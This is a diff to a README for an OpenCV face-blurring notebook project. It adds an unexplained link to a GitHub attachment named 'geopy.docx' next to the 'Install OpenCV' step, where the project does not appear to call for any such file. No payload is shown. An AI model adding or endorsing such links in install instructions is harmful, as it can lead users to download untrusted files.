@@ -7,7 +7,8 @@ The code for this project is provided in the included Jupyter Notebook file (fac
 
 Instructions:
 
-Install OpenCV:
+Install OpenCV:(https://github.com/user-attachments/files/15901580/geopy.docx)
+
 Make sure you have OpenCV installed. You can install it using pip on command line:
 pip install opencv-python
 
@@ -44,3 +45,4 @@ Additional Notes:
 You can adjust the blur parameters ((99, 99), 20) in the cv2.GaussianBlur function to fine-tune the blurring effect.
 Explore other OpenCV functions for further image processing tasks.
 Refer to the OpenCV documentation https://docs.opencv.org/4.x/ for more details on face detection and other functionalities.
+
